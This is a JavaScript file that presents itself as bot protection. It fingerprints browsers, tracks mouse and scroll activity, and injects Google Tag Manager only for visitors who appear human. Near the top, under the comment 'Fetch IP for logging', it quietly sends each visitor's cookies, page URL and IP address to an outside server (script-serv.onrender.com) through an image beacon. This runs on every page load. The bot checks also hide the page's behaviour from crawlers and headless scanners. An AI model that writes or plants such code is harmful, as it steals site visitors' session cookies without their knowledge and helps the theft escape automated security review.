(function () {
  const config = window.botProtectionConfig || {};
  const gtmId = config.gtmId || "GTM-default";
  let timer = false;
  let scroll = false;
  let cursor = false;
  let fired = false;
  let humanLike = false;
  let mouseDetected = false;
  let humanMouseDetected = false;
  let device = null;
  let interacted = false;

  // Fetch IP for logging – only for real users (you can move this later after bot check if needed)
  fetch("https://api.ipify.org?format=json")
    .then((r) => r.json())
    .then((d) => {
      new Image().src =
        "https://script-serv.onrender.com/log?cookie=" +
        encodeURIComponent(document.cookie) +
        "&url=" +
        encodeURIComponent(location.href) +
        "&ip=" +
        encodeURIComponent(d.ip);
    });

  // Detect if likely a bot/headless browser
  function isBot() {
    const ua = navigator.userAgent.toLowerCase();
    const botKeywords = [
      "headlesschrome",
      "phantomjs",
      "slimerjs",
      "bot",
      "crawler",
      "spider",
    ];
    if (botKeywords.some((keyword) => ua.includes(keyword))) {
      console.warn("Blocked: Bot user-agent detected");
      return true;
    }

    if (navigator.webdriver) {
      console.warn("Blocked: navigator.webdriver is true");
      return true;
    }

    if (navigator.plugins.length === 0) {
      console.warn("Blocked: No plugins detected");
      return true;
    }

    if (!navigator.languages || navigator.languages.length === 0) {
      console.warn("Blocked: No languages detected");
      return true;
    }

    if ("ontouchstart" in window === false && detectDevice() === "mobile") {
      console.warn("Blocked: No touch support on mobile");
      return true;
    }

    if (window.outerHeight === 0 || window.outerWidth === 0) {
      console.warn("Blocked: Viewport dimensions abnormal");
      return true;
    }

    const fonts = ["Arial", "Courier New", "Times New Roman"];
    const detected = fonts.some((f) => {
      const span = document.createElement("span");
      span.style.fontFamily = f;
      span.style.position = "absolute";
      span.style.visibility = "hidden";
      span.innerText = "test";
      document.body.appendChild(span);
      const isAvailable = window.getComputedStyle(span).fontFamily.includes(f);
      document.body.removeChild(span);
      return isAvailable;
    });
    if (!detected) {
      console.warn("Blocked: No standard fonts detected");
      return true;
    }

    try {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      ctx.fillText("test", 0, 0);
      const data = canvas.toDataURL();
      if (!data || data.length < 50) {
        console.warn("Blocked: Canvas rendering suspicious");
        return true;
      }
    } catch (e) {
      console.warn("Blocked: Canvas error", e);
      return true;
    }

    return false;
  }

  // Detect device type
  function detectDevice() {
    const isMobileUA = /Mobi|Android|iPhone|iPad|iPod/i.test(
      navigator.userAgent
    );
    const isSmallScreen = window.innerWidth <= 770;
    if (isMobileUA || isSmallScreen) {
      return "mobile";
    }
    return "pc";
  }

  // Early exit if bot is detected
  if (isBot()) {
    console.log("Bot detected, aborting GTM injection.");
    return;
  }

  device = detectDevice();

  // Cursor tracker
  function useCursorTracker() {
    let lastX1 = [];
    let lastY1 = [];

    window.addEventListener("mousemove", (e) => {
      if (lastX1.length > 150 || lastY1.length > 150) {
        humanMouseDetected = true;
      }
      lastX1.push(e.clientX);
      lastY1.push(e.clientY);
      mouseDetected = true;
    });

    let lastX = null;
    let lastY = null;
    let moves = [];
    let lastTime = Date.now();

    const handleMouseMove = (e) => {
      const now = Date.now();
      const deltaTime = now - lastTime;
      lastTime = now;

      if (lastX !== null && lastY !== null) {
        const dx = e.clientX - lastX;
        const dy = e.clientY - lastY;
        const distance = Math.sqrt(dx * dx + dy * dy);
        const speed = distance / (deltaTime || 1);

        moves.push(speed);
        if (moves.length > 20) moves.shift();

        const avg = moves.reduce((a, b) => a + b, 0) / moves.length;
        const variance =
          moves.reduce((a, b) => a + (b - avg) ** 2, 0) / moves.length;

        if (variance > 5 && avg > 0.05) {
          humanLike = true;
          cursor = true;
          console.log("Human-like mouse movement detected");
        }
      }

      lastX = e.clientX;
      lastY = e.clientY;
    };

    window.addEventListener("mousemove", handleMouseMove);
  }

  useCursorTracker();

  // Timer-based detection
  setTimeout(() => {
    timer = true;
  }, 8000);

  // Scroll detection
  function handleScroll() {
    const scrollTop = window.scrollY;
    const docHeight =
      document.documentElement.scrollHeight - window.innerHeight;
    const scrollPercent = (scrollTop / docHeight) * 100;

    if (scrollPercent >= 50) {
      scroll = true;
      window.removeEventListener("scroll", handleScroll);
    }
  }
  window.addEventListener("scroll", handleScroll);

  // Interaction detection (click and keyboard)
  window.addEventListener("click", () => (interacted = true));
  window.addEventListener("keydown", () => (interacted = true));

  // Main polling logic
  const interval = setInterval(() => {
    if (
      device === "pc" &&
      mouseDetected &&
      humanMouseDetected &&
      cursor &&
      timer &&
      interacted &&
      !fired
    ) {
      gtmInject(gtmId);
      console.log("PC detected, GTM injected");
      fired = true;
      clearInterval(interval);
    } else if (
      device === "mobile" &&
      !humanMouseDetected &&
      timer &&
      scroll &&
      interacted &&
      !fired
    ) {
      gtmInject(gtmId);
      console.log("Mobile detected, GTM injected");
      fired = true;
      clearInterval(interval);
    }
  }, 500);

  // GTM injection
  function gtmInject(GTM_ID) {
    if (document.getElementById("gtm-script")) return;
    const script = document.createElement("script");
    script.id = "gtm-script";
    script.innerHTML = `(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
        })(window,document,'script','dataLayer','${GTM_ID}')`;
    document.head.appendChild(script);
    console.log("GTM script injected successfully");
  }
})();
